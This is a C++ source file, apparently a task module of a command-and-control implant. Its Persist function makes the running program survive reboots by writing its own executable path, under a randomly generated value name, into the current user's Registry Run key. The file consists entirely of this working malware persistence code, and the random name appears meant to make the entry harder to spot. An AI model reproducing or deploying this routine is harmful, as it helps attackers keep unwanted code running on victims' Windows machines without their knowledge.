#include "core/task.hpp"

namespace Task
{
    std::wstring Persist(State::PSTATE pState, const std::wstring& wTechnique)
    {
        if (wcscmp(wTechnique.c_str(), L"registry/runkey") == 0)
        {
            // Add an entry to Registry Run.
            HKEY hKey;
            std::wstring wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            // std::wstring wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
            std::wstring wValue = Utils::Random::RandomString(8);
            
            WCHAR wSelfPath[MAX_PATH];
            DWORD dwResult = GetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
            if (dwResult == 0)
            {
                return L"Error: Failed to get the program path.";
            }

            LPCWSTR lpData = wSelfPath;

            LONG result = RegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result == ERROR_SUCCESS)
            {
                result = RegSetValueExW(
                    hKey,
                    wValue.c_str(),
                    0,
                    REG_SZ,
                    (BYTE*)lpData,
                    (wcslen(lpData) + 1) * sizeof(WCHAR)
                );
                if (result != ERROR_SUCCESS)
                {
                    RegCloseKey(hKey);
                    return L"Error: Failed to set value to registry.";
                }

                RegCloseKey(hKey);
                return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";;
            }
            else
            {
                return L"Error: Failed to open key.";
            }
        }
        else
        {
            return L"Not implemented yet.";
        }
    }
}